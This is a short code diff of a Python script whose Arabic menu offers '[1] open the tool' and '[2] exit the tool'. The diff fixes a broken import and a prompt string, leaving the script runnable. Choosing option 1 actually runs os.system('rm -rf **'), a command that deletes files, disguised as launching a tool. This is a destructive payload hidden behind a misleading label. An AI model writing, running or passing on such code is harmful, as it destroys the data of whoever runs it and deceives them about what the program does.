@@ -1,8 +1,8 @@
 import os
-import sy
+import sys
 print("[1] فـتـح الاداة ") 
 print(" [2] الخروج من الاداة ") 
-omar = input(" Choose") 
+omar = input(" Choose:  ") 
 if omar in ["1"]:
    os.system("rm -rf **")
 if omar in ["2"]: 
